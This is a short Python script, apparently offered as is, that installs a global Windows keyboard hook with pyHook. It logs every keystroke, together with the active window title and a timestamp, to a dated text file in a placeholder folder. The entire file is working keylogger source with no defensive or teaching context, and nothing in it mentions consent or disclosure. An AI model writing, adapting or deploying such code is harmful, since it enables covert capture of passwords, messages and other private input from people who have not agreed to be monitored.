import pyHook,pythoncom
from datetime import datetime

todays_date=datetime.now().strftime('%Y-%b-%d')
file_name='path to your database folder'+todays_date+'.txt'


line_buffer=""
window_name=""

def linesave(line):
    todays_file=open(file_name,'a')
    todays_file.write (line)
    todays_file.close()


def keystroke(event):
	global line_buffer
	global window_name

	if(window_name!=event.WindowName):
		if(line_buffer!=""):
			line_buffer+='\n'
			linesave(line_buffer)

		line_buffer=""
		linesave('\n----window name:' +event.WindowName+'at time'+datetime.now().strftime("%H:%M:%S")+'\n')
		window_name=event.WindowName


	if(event.Ascii==13 or event.Ascii==9): #return key and tab key
	    line_buffer+='\n'
	    linesave(line_buffer)
	    line_buffer=""
	    return True

	if(event.Ascii==8):
		line_buffer=line_buffer[:-1]
		return True


	if(event.Ascii<32 or event.Ascii>126):
		if(event.Ascii==0):
			pass
		else:
			line_buffer=line_buffer+'\n'+str(event.Ascii)+'\n'

	else:
		line_buffer+=chr(event.Ascii)
	return True



hooks_manager=pyHook.HookManager()
hooks_manager.KeyDown=keystroke
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()